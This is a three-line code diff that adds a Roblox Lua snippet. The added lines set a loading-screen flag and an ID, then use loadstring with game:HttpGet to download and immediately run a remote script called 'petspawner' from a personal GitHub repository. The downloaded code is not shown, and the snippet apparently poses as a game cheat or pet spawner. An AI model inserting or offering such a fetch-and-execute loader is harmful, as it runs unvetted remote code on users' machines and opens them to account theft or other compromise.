@@ -1,0 +1,3 @@
+  _G.LoadingScreen = true
+  ID="322c9411-9cda-4c11-8a4f-ff14bd92d087";
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/babo96290-sudo/petspawner/refs/heads/main/petspawner"))()
